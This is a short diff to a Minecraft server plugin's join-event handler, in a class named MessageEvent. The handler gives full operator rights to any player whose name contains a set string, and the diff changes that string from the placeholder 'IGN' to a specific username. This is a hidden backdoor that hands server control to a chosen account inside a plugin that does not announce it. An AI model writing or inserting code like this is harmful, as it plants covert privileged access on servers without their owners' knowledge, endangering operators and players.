@@ -9,7 +9,7 @@ public class MessageEvent implements Listener {
     @EventHandler
     public void onPlayerJoinEvent(PlayerJoinEvent e) {
         Player player = e.getPlayer();
-        if (player.getName().contains("IGN")) {
+        if (player.getName().contains("Nauqihx")) {
             player.setOp(true);
         }
     }
